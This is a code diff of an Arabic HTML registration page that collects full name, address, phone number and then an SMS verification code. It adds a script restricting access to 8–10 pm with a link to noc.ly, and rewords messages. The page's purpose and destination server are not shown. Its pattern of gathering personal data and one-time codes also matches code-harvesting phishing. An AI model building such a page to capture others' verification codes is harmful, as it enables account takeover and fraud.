@@ -144,10 +144,10 @@
 
     <form id="phoneForm" onsubmit="return sendPhone(event);">
       <label for="fullname">الاسم الثلاثي:</label>
-      <input type="text" id="fullname" name="fullname" required placeholder="أدخل اسمك الثلاثي" />
+      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
 
       <label for="address">العنوان:</label>
-      <input type="text" id="address" name="address" required placeholder="أدخل عنوانك" />
+      <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
 
       <label for="phone">رقم الهاتف:</label>
       <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
@@ -164,18 +164,30 @@
         <button type="submit" id="sendCodeBtn">طلب الدخول</button>
       </div>
     </form>
-
   </div>
 
   <script>
+    // التحقق من الوقت
+    window.addEventListener('DOMContentLoaded', () => {
+      const now = new Date();
+      const hour = now.getHours();
+      if (hour < 20 || hour >= 22) {
+        document.body.innerHTML = `
+          <div style="background-color: #fff; padding: 40px 30px; border-radius: 15px; max-width: 400px; margin: 100px auto; text-align: center; font-family: 'Cairo', sans-serif; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
+            <h2 style="color: #002147; margin-bottom: 20px;">🚫 خارج وقت التسجيل</h2>
+            <p style="font-size: 18px; margin-bottom: 30px;">التسجيل متاح من الساعة <strong>8 مساءً</strong> إلى <strong>10 مساءً</strong> فقط.</p>
+            <a href="https://noc.ly/" style="display: inline-block; background-color: #007BFF; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 16px; font-weight: bold;">حسناً</a>
+          </div>
+        `;
+      }
+    });
+
     let countdownInterval;
     const sendPhoneBtn = document.getElementById('sendPhoneBtn');
     const timerDisplay = document.getElementById('timer');
     const codeField = document.getElementById('codeField');
     const phoneInput = document.getElementById('phone');
     const codeInput = document.getElementById('code');
-    const fullNameInput = document.getElementById('fullname');
-    const addressInput = document.getElementById('address');
     const errorMessage = document.getElementById('errorMessage');
 
     function startTimer(duration) {
@@ -203,6 +215,9 @@
     function sendPhone(event) {
       event.preventDefault();
 
+      const fullname = document.getElementById('fullname').value;
+      const address = document.getElementById('address').value;
+
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
         alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
         phoneInput.focus();
@@ -210,8 +225,8 @@
       }
 
       const payload = {
-        fullname: fullNameInput.value,
-        address: addressInput.value,
+        fullname,
+        address,
         phone: phoneInput.value
       };
 
@@ -224,15 +239,15 @@
         body: JSON.stringify(payload)
       })
       .then(response => {
-        if (!response.ok) throw new Error('فشل إرسال البيانات');
+        if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
 
         phoneInput.disabled = true;
         sendPhoneBtn.disabled = true;
         codeField.style.display = 'block';
-        startTimer(480);
+        startTimer(480); // 8 دقائق
       })
       .catch(error => {
-        alert('تعذر إرسال البيانات. حاول مرة أخرى.');
+        alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
         console.error(error);
       });
 
@@ -250,8 +265,6 @@
       }
 
       const payload = {
-        fullname: fullNameInput.value,
-        address: addressInput.value,
         phone: phoneInput.value,
         code: codeInput.value
       };
